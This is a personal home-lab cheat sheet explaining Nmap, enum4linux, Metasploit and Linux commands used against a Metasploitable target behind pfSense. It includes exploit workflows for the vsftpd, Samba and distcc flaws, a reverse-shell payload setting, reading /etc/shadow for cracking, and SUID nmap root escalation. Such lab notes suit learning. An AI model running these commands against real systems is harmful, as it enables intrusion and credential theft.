# CLI Command Reference — CySec Home Lab

A breakdown of every command used across all exercises, with explanations
of each component. Grouped by tool.

---

## Nmap

Nmap is a network scanner. It sends packets to targets and analyses
responses to map open ports, services, and vulnerabilities.

---

### Basic Service Version Scan

```bash
nmap -sV 192.168.56.101
```

| Component | Meaning |
|---|---|
| `nmap` | Launch Nmap |
| `-sV` | Service Version detection — identifies what software and version is running on each open port |
| `192.168.56.101` | Target IP address |

---

### Vulnerability Script Scan

```bash
nmap --script smb-vuln-ms17-010 192.168.56.101
```

| Component | Meaning |
|---|---|
| `--script` | Load and run an NSE (Nmap Scripting Engine) script |
| `smb-vuln-ms17-010` | The specific script to run — checks if the target is vulnerable to EternalBlue (MS17-010 / WannaCry) |
| `192.168.56.101` | Target IP address |

---

### Specific Port Scan

```bash
nmap -p 21,6200 192.168.1.100
```

| Component | Meaning |
|---|---|
| `-p` | Specify which ports to scan |
| `21,6200` | Scan only port 21 (FTP) and port 6200 (vsftpd backdoor bind port) |
| `192.168.1.100` | Target IP address |

---

### Advanced Evasion Scan

```bash
nmap -sV --version-intensity 5 -T2 -f 192.168.1.100
```

| Component | Meaning |
|---|---|
| `-sV` | Service version detection |
| `--version-intensity 5` | How hard Nmap tries to identify the version — scale 0-9, higher = more probes sent |
| `-T2` | Timing template — T0 slowest, T5 fastest. T2 = Polite, slow enough to avoid triggering IDS |
| `-f` | Fragment packets — splits packets into smaller pieces to evade basic packet inspection |
| `192.168.1.100` | Target IP address |

---

## enum4linux

enum4linux extracts information from Windows and Samba (Linux SMB) targets.
Named after the four protocols it uses to enumerate: SMB, RPC, NetBIOS, LDAP.

---

### Full Enumeration

```bash
enum4linux 192.168.56.101
```

| Component | Meaning |
|---|---|
| `enum4linux` | Launch the tool |
| `192.168.56.101` | Target IP — runs all enumeration checks by default, no flags needed |

**What it extracts:** hostname, workgroup, OS version, open shares,
usernames, password policies, MAC address. Null session (unauthenticated)
access required — rejected on patched systems.

---

## Metasploit

Metasploit is an exploitation framework. You load an exploit module,
configure it, then run it against a target.

---

### Launch Metasploit

```bash
msfconsole
```

Launches the Metasploit interactive console. All subsequent commands
are run inside this console.

---

### Full Exploit Workflow

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set LHOST 192.168.56.102
run
```

| Command | Meaning |
|---|---|
| `use exploit/unix/ftp/vsftpd_234_backdoor` | Load the exploit module. Path = category/platform/service/name |
| `set RHOSTS 192.168.1.100` | Set the target IP. RHOSTS = Remote Hosts |
| `set LHOST 192.168.56.102` | Set your own IP for reverse shells to call back to. LHOST = Local Host |
| `run` | Execute the exploit with the configured options. Same as `exploit` |

---

### Exploit Modules Used

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
vsftpd 2.3.4 backdoor (CVE-2011-2523). Targets port 21. Opens a bind
shell on port 6200 — attacker connects to it.

```bash
use exploit/multi/samba/usermap_script
```
Samba Usermap Script (CVE-2007-2447). Targets port 139. `multi` means
it works across multiple platforms. Opens a reverse shell — target
calls back to attacker on port 4444.

```bash
use exploit/unix/misc/distcc_exec
```
distcc Remote Code Execution (CVE-2004-2687). Targets port 3632.
distcc is a distributed C compiler — this exploit injects commands
into the compilation process. Returns a low-privilege shell as `daemon`.

---

### Set a Specific Payload

```bash
set PAYLOAD cmd/unix/reverse_perl
```

| Component | Meaning |
|---|---|
| `set PAYLOAD` | Override the default payload |
| `cmd/unix/reverse_perl` | Spawn a reverse shell using Perl. Useful when netcat is not available on the target |

---

### Check Module Options

```bash
show options
```

Displays all configurable settings for the current module — which are
required, which are optional, and their current values. Always run
this before `run` to confirm everything is set correctly.

---

## Linux Shell — General

Commands run inside a shell on the target machine after exploitation,
or on Kali during setup.

---

### Check Current User

```bash
id
```

Shows current user ID, group ID, and group memberships.
`uid=0(root)` = root access. First command to run after getting a shell
to confirm privilege level.

---

### Read User Accounts

```bash
cat /etc/passwd
```

| Component | Meaning |
|---|---|
| `cat` | Concatenate and print file contents to the terminal |
| `/etc/passwd` | System file listing all user accounts — username, UID, home directory, shell. Readable by any user |

---

### Read Password Hashes

```bash
cat /etc/shadow
```

| Component | Meaning |
|---|---|
| `cat` | Print file contents |
| `/etc/shadow` | System file containing hashed passwords for all accounts. Only readable by root |

Getting this file means you can attempt offline password cracking with
tools like hashcat or John the Ripper.

---

### Upgrade to Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

| Component | Meaning |
|---|---|
| `python` | Run Python interpreter |
| `-c` | Execute the following string as Python code |
| `import pty` | Import Python's pseudo-terminal module |
| `pty.spawn("/bin/bash")` | Spawn a fully interactive bash shell inside a pseudo-terminal |

Raw exploit shells often have no prompt and broken keyboard shortcuts.
This command upgrades them to a proper interactive shell.

---

### Find SUID Files

```bash
find / -perm -4000 -type f 2>/dev/null
```

| Component | Meaning |
|---|---|
| `find` | Search for files |
| `/` | Start searching from the root directory (entire filesystem) |
| `-perm -4000` | Match files with the SUID bit set (runs as file owner regardless of who executes it) |
| `-type f` | Match files only, not directories |
| `2>/dev/null` | Redirect error messages (stderr) to /dev/null — suppresses "Permission denied" noise |

SUID files owned by root that allow command execution = privilege
escalation vector. Nmap on Metasploitable had this misconfiguration.

---

### Nmap Interactive Mode (SUID Exploit)

```bash
nmap --interactive
```

Launches nmap's interactive shell. Only available in old nmap versions.
When nmap has SUID root, this runs as root.

```bash
!sh
```

Inside nmap interactive mode — the `!` prefix executes a system command.
`!sh` spawns a system shell. Combined with SUID nmap = instant root shell.

---

### List Running Processes

```bash
ps aux
```

| Component | Meaning |
|---|---|
| `ps` | Process status — show running processes |
| `a` | Show processes from all users |
| `u` | Show in user-oriented format (username, CPU, memory) |
| `x` | Include processes not attached to a terminal |

Used to verify the reverse shell process was visible on Metasploitable
as the `daemon` user after the distcc exploit.

---

### Show Network Connections

```bash
netstat -antp
```

| Component | Meaning |
|---|---|
| `netstat` | Network statistics — display active connections and listening ports |
| `-a` | Show all sockets (listening and established) |
| `-n` | Show numeric IPs and ports instead of resolving hostnames |
| `-t` | Show TCP connections only |
| `-p` | Show the PID and process name for each connection |

Used to confirm the reverse shell connection was active and identify
the process responsible.

---

### Show Network Interface Info

```bash
ifconfig
```

Displays configuration for all network interfaces — IP address, MAC
address, subnet mask, traffic statistics. Used to verify Metasploitable
received IP 192.168.1.100 from pfSense's DHCP server.

---

### Shut Down System

```bash
sudo poweroff
```

| Component | Meaning |
|---|---|
| `sudo` | Run the following command as superuser |
| `poweroff` | Cleanly shut down the system |

Always preferred over VirtualBox "Save State" for Metasploitable —
saving state can cause network adapter issues on next boot.

---

## Networking — Routing

Commands for configuring how traffic flows between networks.

---

### Add Static Route (Kali)

```bash
sudo ip route add 192.168.1.0/24 via 192.168.56.104
```

| Component | Meaning |
|---|---|
| `sudo` | Run as superuser |
| `ip route add` | Add a new entry to the routing table |
| `192.168.1.0/24` | The destination network to route to (`/24` = 255.255.255.0 subnet mask, covers 192.168.1.1–192.168.1.254) |
| `via 192.168.56.104` | Send traffic for that network via this gateway — pfSense's WAN address |

Without this, Kali had no route to 192.168.1.x and returned
"Network is unreachable".

---

### Add Default Gateway (Metasploitable)

```bash
sudo route add default gw 192.168.1.1
```

| Component | Meaning |
|---|---|
| `sudo` | Run as superuser |
| `route add` | Add a routing table entry |
| `default` | Apply to all traffic with no more specific route (catch-all) |
| `gw 192.168.1.1` | Gateway — send default traffic via pfSense's LAN interface |

Without this, Metasploitable received packets from Kali but had no
idea how to send replies back — causing 100% packet loss on Kali's ping.

---

### Test Connectivity

```bash
ping 192.168.1.100
```

| Component | Meaning |
|---|---|
| `ping` | Send ICMP echo request packets to a host |
| `192.168.1.100` | Target IP to test |

Replies = host reachable. 100% packet loss = host down or firewall
blocking ICMP. "Network is unreachable" = no route to that network exists.

---

## pfSense Console Commands

Commands run inside the pfSense shell (option 8 from the console menu).

---

### Allow WAN Access via EasyRule

```bash
easyrule pass wan tcp any any 443
```

| Component | Meaning |
|---|---|
| `easyrule` | pfSense quick rule creation tool |
| `pass` | Allow the traffic |
| `wan` | Apply the rule to the WAN interface |
| `tcp` | Protocol |
| `any any` | Any source, any destination |
| `443` | Destination port — HTTPS, used to access the web GUI |

---

### Enable Web GUI on WAN

```bash
pfSsh.php playback enableallowallwan
```

| Component | Meaning |
|---|---|
| `pfSsh.php` | pfSense's PHP shell script runner |
| `playback` | Execute a named playbook |
| `enableallowallwan` | Built-in playbook that enables web GUI access from the WAN interface |

Used because pfSense's web GUI only listens on LAN by default —
this allows Kali (on the WAN side) to access it.

---

*Last updated: 11/03/2026 — Exercises 01–06*
